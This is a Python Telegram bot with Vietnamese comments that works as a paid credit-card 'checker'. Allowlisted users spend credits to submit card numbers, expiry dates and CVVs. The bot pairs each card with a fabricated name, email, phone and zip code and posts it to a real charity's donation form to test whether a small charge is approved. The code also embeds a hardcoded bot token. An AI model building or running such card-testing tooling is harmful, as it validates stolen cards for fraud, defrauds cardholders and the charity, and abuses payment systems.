import logging
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import time
import os

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thiết lập nest_asyncio
nest_asyncio.apply()

# Hàm để đọc và ghi credit từ file
def read_credits():
    if not os.path.exists("credits.txt"):
        return {}
    with open("credits.txt", "r") as f:
        lines = f.readlines()
    credits = {int(line.split(":")[0]): int(line.split(":")[1]) for line in lines}
    return credits

def write_credits(credits):
    with open("credits.txt", "w") as f:
        for user_id, credit in credits.items():
            f.write(f"{user_id}:{credit}\n")

# Hàm để tạo số ngẫu nhiên trong khoảng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# Hàm để tạo email ngẫu nhiên
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# Hàm để tạo tên ngẫu nhiên
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Hàm để tạo mã bưu điện ngẫu nhiên
def random_zipcode():
    return random_num(1000, 9000)

# Hàm để kiểm tra định dạng thẻ và lấy thông tin
def extract_card_info(card_input):
    # Điều chỉnh biểu thức chính quy để nhận cả năm 2 hoặc 4 chữ số
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        # Nếu ano chỉ có 2 chữ số thì thêm "20" vào trước
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# Hàm để tìm thông báo lỗi trong phản hồi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()  # Trả về thông báo lỗi
    return None

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")

# Hàm xử lý lệnh /user để kiểm tra credit của người dùng
async def check_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = read_credits()
    credit = credits.get(user_id, 0)  # Mặc định 0 nếu không có thông tin

    await update.message.reply_text(f"User ID: {user_id}\nCredit còn lại: {credit}")

# Hàm để thêm credit cho người dùng (dành cho admin)
async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID của admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
    except (IndexError, ValueError):
        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /credit <user_id> <credit>")
        return

    credits = read_credits()
    credits[user_id] = credits.get(user_id, 0) + amount
    write_credits(credits)

    await update.message.reply_text(f"Đã thêm {amount} credit cho User ID: {user_id}.")

# Hàm xử lý lệnh /allow và /unallow
async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID của admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /allow <user_id>")
        return

    with open("allowed_users.txt", "a") as f:
        f.write(f"{user_id}\n")
    
    await update.message.reply_text(f"Đã cho phép User ID: {user_id}.")

async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID của admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /unallow <user_id>")
        return

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if user_id in allowed_users:
        allowed_users.remove(user_id)
        with open("allowed_users.txt", "w") as f:
            for user in allowed_users:
                f.write(f"{user}\n")
        await update.message.reply_text(f"Đã thu hồi quyền của User ID: {user_id}.")
    else:
        await update.message.reply_text(f"User ID: {user_id} không có trong danh sách cho phép.")

# Hàm xử lý lệnh /proxy
async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        proxy = context.args[0]  # Lấy proxy theo định dạng <ip>:<port>:<user>:<pass>
        await update.message.reply_text(f"Proxy đã được thiết lập: {proxy}")
    except IndexError:
        await update.message.reply_text("Vui lòng cung cấp proxy theo định dạng: /proxy <ip>:<port>:<user>:<pass>")

# Hàm xử lý tin nhắn và trừ 5 credits sau mỗi lần kiểm tra
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    card_info = extract_card_info(user_input)

    if not card_info:
        return  # Nếu không có thông tin thẻ, bot sẽ không trả lời

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if update.effective_user.id not in allowed_users:
        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
        return

    # Trừ credit của user
    credits = read_credits()
    if update.effective_user.id not in credits or credits[update.effective_user.id] < 5:
        await update.message.reply_text("Bạn không có đủ credit để thực hiện thao tác này.")
        return
    credits[update.effective_user.id] -= 5
    write_credits(credits)

    cc, mes, ano, cvv = card_info

    # Kiểm tra tháng và năm hết hạn
    current_year = int(datetime.now().strftime("%y"))  # Lấy 2 chữ số cuối năm hiện tại
    current_full_year = int(datetime.now().strftime("%Y"))  # Lấy 4 chữ số năm hiện tại
    current_month = int(datetime.now().strftime("%m"))  # Lấy tháng hiện tại

    if len(ano) == 2:
        ano = "20" + ano  # Chuyển đổi năm 2 chữ số thành 4 chữ số
    ano = int(ano)

    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
        await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
        return

    phone = random_num(710000009, 900000009)  # Tạo số điện thoại ngẫu nhiên
    email = random_email()  # Tạo email ngẫu nhiên
    name = random_name()  # Tạo tên ngẫu nhiên
    zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên

    payload = {
        "tfa_1": name,
        "tfa_3": email,
        "tfa_4": phone,
        "tfa_21": name,
        "tfa_25": email,
        "tfa_27": phone,
        "tfa_5": cc,
        "tfa_6": mes,
        "tfa_7": ano,
        "tfa_8": cvv,
        "tfa_17": zipcode
    }

    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor", data=payload) as response:
            result_text = await response.text()

            end_time = time.time()
            elapsed_time = int(end_time - start_time)

            if "https://anglicaresa.com.au/success/" in result_text:
                await update.message.reply_text(
                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved\n𝗧𝗶𝗺𝗲: {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                )
            else:
                error_message = extract_error_message(result_text)
                await update.message.reply_text(
                    f"Declined\n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message or 'Unknown Error'}\n𝗧𝗶𝗺𝗲: {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                )

# Hàm khởi tạo bot
async def main():
    bot_token = "5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro"
    application = ApplicationBuilder().token(bot_token).build()

    # Đăng ký các handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("credit", add_credit))
    application.add_handler(CommandHandler("user", check_user))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("unallow", unallow_user))
    application.add_handler(CommandHandler("proxy", set_proxy))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Gửi thông báo khi bot khởi động
    logger.info("Bot đã khởi động")

    await application.start()
    await application.idle()

if __name__ == "__main__":
    asyncio.run(main())
